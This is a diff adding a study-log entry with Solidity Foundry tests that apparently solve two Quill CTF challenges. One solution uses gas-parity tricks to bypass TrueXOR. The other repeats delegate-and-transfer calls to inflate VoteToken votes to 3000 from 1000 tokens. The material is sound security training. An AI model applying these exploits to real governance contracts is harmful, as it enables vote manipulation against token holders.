@@ -979,4 +979,96 @@ contract WETH10Exploit{
         weth.withdrawAll();
 ```
 
+### 2024.09.15
+
+- Quill CTF: TrueXOR
+- Quill CTF: VoteToken
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/TrueXOR.sol";
+
+
+contract TrueXORTest is Test {
+    TrueXOR public txor;
+    address bob;
+
+    function setUp() public {
+        txor = new TrueXOR();
+        bob = address(1);
+    }
+
+    function testHack() public {
+        TrueXORExploit te = new TrueXORExploit();
+        vm.startPrank(bob, bob);
+        txor.ctf(address(te));
+        vm.stopPrank();
+    }
+}
+
+contract TrueXORExploit is IBoolGiver {
+
+  function giveBool() external view override returns (bool) {
+    uint256 g = gasleft();
+    if(g%2 == 1)
+        return true;
+    else
+        return false;
+  }
+
+}
+```
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.12;
+
+import "forge-std/Test.sol";
+import "../src/VoteToken.sol";
+
+contract VoteTokenTest is Test {
+	VoteToken vToken;
+	address public owner = address(0);
+	address public hacker =address(1337);
+
+	address public alice= address(1);
+	address public bob = address(2);
+	address public carl = address(3);
+
+	function setUp() public {
+		vm.startPrank(owner);
+		vToken = new VoteToken();
+		vToken.mint(alice, 1000);
+		vm.stopPrank();
+  }
+	
+	function testExploit() public {
+    vm.startPrank(alice);
+    vToken.delegate(hacker);
+    vToken.transfer(bob, 1000);
+    vm.stopPrank();
+    vm.startPrank(bob);
+    vToken.delegate(hacker);
+    vToken.transfer(carl, 1000);
+    vm.stopPrank();
+    vm.startPrank(carl);
+    vToken.delegate(hacker);
+    vToken.transfer(hacker, 1000);            
+    vm.stopPrank();
+
+		uint hacker_vote = vToken.getVotes(hacker);
+    console.log("Vote Count of Hacker before attack: %s ", hacker_vote);
+
+		uint hacker_balance= vToken.balanceOf(hacker);
+    console.log("Hacker's vToken after the attack: %s: ", hacker_balance);
+
+		assertEq(hacker_vote , 3000);
+		assertEq(hacker_balance, 1000);
+	}
+}
+```
+
 <!-- Content_END -->
